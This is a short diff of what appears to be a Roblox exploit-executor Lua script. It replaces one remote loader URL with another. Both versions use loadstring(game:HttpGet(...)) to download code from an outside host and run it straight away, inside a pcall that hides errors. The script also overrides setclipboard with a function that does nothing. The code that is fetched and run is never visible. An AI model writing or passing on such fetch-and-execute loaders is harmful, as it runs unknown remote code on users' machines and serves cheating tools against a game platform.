@@ -13,7 +13,9 @@ else
 task.spawn(function()
     pcall(function() 
 setclipboard = function() return end
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJsb2FkZXIifQ"))()
+ID="6710c962-7192-471b-8f42-cf9a1a8c4ab5";
+RUN_AFTER=nil;
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
     end)
 end)
 end
